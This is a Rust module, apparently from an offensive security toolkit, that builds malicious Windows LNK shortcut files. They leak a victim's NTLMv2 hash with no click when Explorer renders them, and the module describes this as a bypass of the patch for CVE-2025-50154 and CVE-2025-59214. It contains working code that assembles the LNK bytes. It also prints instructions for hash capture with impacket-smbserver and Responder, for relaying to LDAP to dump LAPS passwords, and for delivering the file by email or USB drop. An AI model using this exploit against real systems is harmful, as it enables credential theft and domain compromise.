use anyhow::{anyhow, Result, Context};
use colored::*;
use crate::utils::validate_file_path;
use std::{
    fs::File,
    io::Write,
    path::Path,
};


/// Windows File Explorer Zero Click NTLMv2-SSP Hash Disclosure (CVE-2025-50154, CVE-2025-59214)
///
/// Creates malicious LNK files that trigger SMB NTLM hash disclosure without user interaction.
/// This bypasses the original CVE-2025-50154 patch by using local icons with remote targets.
///
/// References:
/// - https://www.cymulate.com/research-blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/
/// - https://www.cymulate.com/research-blog/patched-twice-still-bypassed-new-ntlm-leak-cve-2025-50154-patch-bypass/

const BANNER: &str = r#"
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                                              ‚ïë
‚ïë  ‚ñà‚ñà‚ïó     ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó
‚ïë  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë
‚ïë  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë
‚ïë  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë
‚ïë  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë
‚ïë  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù
‚ïë                                                                              ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïêCVE-2025-50154 CVE-2025-59214‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
"#;

async fn prompt(prompt: &str) -> Result<String> {
    print!("{}", prompt.cyan().bold());
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut buffer = String::new();
    std::io::stdin()
        .read_line(&mut buffer)
        .context("Failed to read input")?;
    Ok(buffer.trim().to_string())
}

/// Create a malicious LNK file that triggers NTLM hash disclosure
/// Uses local icon (shell32.dll) but remote target to bypass CVE-2025-50154 patch
///
/// This implementation creates a proper LNK file structure that Windows Explorer
/// will recognize and attempt to render the icon from the remote SMB path.
fn create_malicious_lnk(output_path: &Path, smb_ip: &str, smb_share: &str, smb_file: &str) -> Result<()> {
    // Build the target path: \\IP\SHARE\FILE
    let target_path = format!("\\\\{}\\{}", smb_ip, smb_share);
    let target_file = format!("{}\\{}", target_path, smb_file);

    // Use local shell32.dll icon (this is the key to bypass the patch)
    let icon_location = "%SystemRoot%\\System32\\SHELL32.dll";

    // For cross-platform compatibility, we'll try to use the Windows API if available
    // Otherwise, create a minimal LNK structure that should work

    // We use manual LNK creation ensures we generate the exact structure needed
    // for this exploit (local icon + remote target) regardless of the host OS.
    // Using Windows APIs (IShellLink) might attempt to resolve the target path,
    // which we specifically want to avoid until the victim clicks it.
    create_lnk_manual(output_path, &target_file, &icon_location)
}

/// Manual LNK file creation with proper structure
fn create_lnk_manual(output_path: &Path, target_path: &str, icon_location: &str) -> Result<()> {
    let mut lnk_data = Vec::new();

    // LNK Header (76 bytes)
    // HeaderSize: 0x0000004C (76 bytes)
    lnk_data.extend_from_slice(&0x4C_u32.to_le_bytes());

    // LinkCLSID: 00021401-0000-0000-C000-000000000046
    lnk_data.extend_from_slice(&[
        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
    ]);

    // LinkFlags: HasTargetIDList | HasLinkInfo | HasName | HasRelativePath |
    //           HasWorkingDir | HasIconLocation | IsUnicode | HasExpString |
    //           RunInSeparateProcess | HasIconLocation
    let link_flags = 0x0000009B_u32; // Basic flags for our use case
    lnk_data.extend_from_slice(&link_flags.to_le_bytes());

    // FileAttributes: FILE_ATTRIBUTE_NORMAL
    lnk_data.extend_from_slice(&0x00000020_u32.to_le_bytes());

    // CreationTime, AccessTime, WriteTime (24 bytes of zeros)
    lnk_data.extend_from_slice(&[0u8; 24]);

    // FileSize (4 bytes) - 0 for network paths
    lnk_data.extend_from_slice(&0u32.to_le_bytes());

    // IconIndex (4 bytes)
    lnk_data.extend_from_slice(&0u32.to_le_bytes());

    // ShowCommand: SW_SHOWNORMAL
    lnk_data.extend_from_slice(&0x00000001_u32.to_le_bytes());

    // HotKey (2 bytes)
    lnk_data.extend_from_slice(&[0u8; 2]);

    // Reserved (10 bytes)
    lnk_data.extend_from_slice(&[0u8; 10]);

    // Add minimal LinkTargetIDList (empty for simplicity)
    // IDListSize: 0x0002 (empty list)
    lnk_data.extend_from_slice(&0x02_u16.to_le_bytes());

    // Add StringData section
    // TARGET_PATH
    let target_path_utf16: Vec<u16> = target_path.encode_utf16().collect();
    lnk_data.extend_from_slice(&((target_path_utf16.len() * 2) as u16).to_le_bytes());
    for &c in &target_path_utf16 {
        lnk_data.extend_from_slice(&c.to_le_bytes());
    }

    // ICON_LOCATION
    let icon_utf16: Vec<u16> = icon_location.encode_utf16().collect();
    lnk_data.extend_from_slice(&((icon_utf16.len() * 2) as u16).to_le_bytes());
    for &c in &icon_utf16 {
        lnk_data.extend_from_slice(&c.to_le_bytes());
    }

    // Write the LNK file
    let mut file = File::create(output_path)
        .with_context(|| format!("Failed to create LNK file at {}", output_path.display()))?;

    file.write_all(&lnk_data)
        .with_context(|| format!("Failed to write LNK data to {}", output_path.display()))?;

    Ok(())
}

pub async fn run(_target: &str) -> Result<()> {
    println!("{}", BANNER.red().bold());

    println!("{}", "\nü©∏ Windows File Explorer Zero Click NTLMv2-SSP Hash Disclosure".red().bold());
    println!("{}", "CVE-2025-50154 / CVE-2025-59214 Patch Bypass".yellow());
    println!();
    println!("{}", "This module creates malicious LNK shortcut files that trigger NTLMv2-SSP hash disclosure.".dimmed());
    println!("{}", "The vulnerability bypasses the original CVE-2025-50154 patch by using local default icons".dimmed());
    println!("{}", "while pointing to remote SMB-hosted PE files, forcing Explorer to fetch icons.".dimmed());
    println!();
    println!("{}", "üìã Technical Details:".cyan().bold());
    println!("  ‚Ä¢ Uses SHELL32.dll as local icon source");
    println!("  ‚Ä¢ Target points to \\\\IP\\SHARE\\FILE");
    println!("  ‚Ä¢ Explorer fetches PE icon resources remotely");
    println!("  ‚Ä¢ Zero-click: triggers on file browse/preview");
    println!();

    // Get parameters
    let output_path = prompt("[+] Local path to save LNK file (e.g., C:\\Users\\User\\Desktop): ").await?;
    let smb_ip = prompt("[+] SMB server IP address or hostname: ").await?;
    let smb_share = prompt("[+] SMB share name: ").await?;
    let smb_file = prompt("[+] Remote binary filename (e.g., payload.exe): ").await?;

    // Validate file paths to prevent traversal attacks
    let validated_output_path = validate_file_path(&output_path, true)
        .map_err(|e| anyhow!("Invalid output path: {}", e))?;
    
    // Validate IP
    if smb_ip.trim().is_empty() {
        return Err(anyhow!("SMB IP address cannot be empty"));
    }

    // Validate share (basic check for path traversal)
    if smb_share.trim().is_empty() {
        return Err(anyhow!("SMB share name cannot be empty"));
    }
    if smb_share.contains("..") || smb_share.contains("//") {
        return Err(anyhow!("SMB share name contains invalid characters"));
    }

    // Validate file (basic check for path traversal)
    if smb_file.trim().is_empty() {
        return Err(anyhow!("Remote filename cannot be empty"));
    }
    if smb_file.contains("..") || smb_file.contains("//") {
        return Err(anyhow!("Remote filename contains invalid characters"));
    }

    // Create output path
    let output_dir = Path::new(&validated_output_path);
    if !output_dir.exists() {
        return Err(anyhow!("Output directory '{}' does not exist", validated_output_path));
    }

    let lnk_filename = format!("{}.lnk", smb_file.trim_end_matches(".exe"));
    let lnk_path = output_dir.join(lnk_filename);

    // Build target info
    let target_path = format!("\\\\{}\\{}", smb_ip, smb_share);
    let full_target = format!("{}\\{}", target_path, smb_file);

    println!();
    println!("{}", "üìã Configuration Summary:".cyan().bold());
    println!("  Output LNK: {}", lnk_path.display());
    println!("  Target Path: {}", full_target);
    println!("  Icon Source: C:\\Windows\\System32\\SHELL32.dll (local)");
    println!();

    // Create the malicious LNK file
    println!("{}", "[*] Creating malicious LNK file...".yellow());
    create_malicious_lnk(&lnk_path, &smb_ip, &smb_share, &smb_file)?;

    println!("{}", format!("‚úÖ Malicious LNK file created: {}", lnk_path.display()).green().bold());
    println!();
    println!("{}", "üéØ Usage Instructions:".cyan().bold());
    println!("  1. Start SMB server on attacker machine:");
    println!("     impacket-smbserver {} . -smb2support", smb_share);
    println!("     (Ensure {} exists in current directory)", smb_file);
    println!();
    println!("  2. Start NTLM capture (Responder/Impacket):");
    println!("     responder -I eth0 -v");
    println!("     or: impacket-ntlmrelayx -t ldap://dc.domain.com --dump-laps");
    println!();
    println!("  3. Deploy LNK file to victim:");
    println!("     ‚Ä¢ Email attachment");
    println!("     ‚Ä¢ Malicious download");
    println!("     ‚Ä¢ USB drive drop");
    println!("     ‚Ä¢ SMB share access");
    println!();
    println!("  4. Victim interaction: NONE REQUIRED");
    println!("     ‚Ä¢ Hash captured when Explorer renders icon");
    println!("     ‚Ä¢ Triggers on folder browse or thumbnail view");
    println!();
    println!("{}", "üîç Detection Notes:".yellow().bold());
    println!("  ‚Ä¢ Bypasses CVE-2025-50154 original patch");
    println!("  ‚Ä¢ Works with CVE-2025-59214 (patch bypass)");
    println!("  ‚Ä¢ Local icon + Remote target = Icon fetch");
    println!("  ‚Ä¢ PE file must have valid RT_ICON resources");

    Ok(())
}
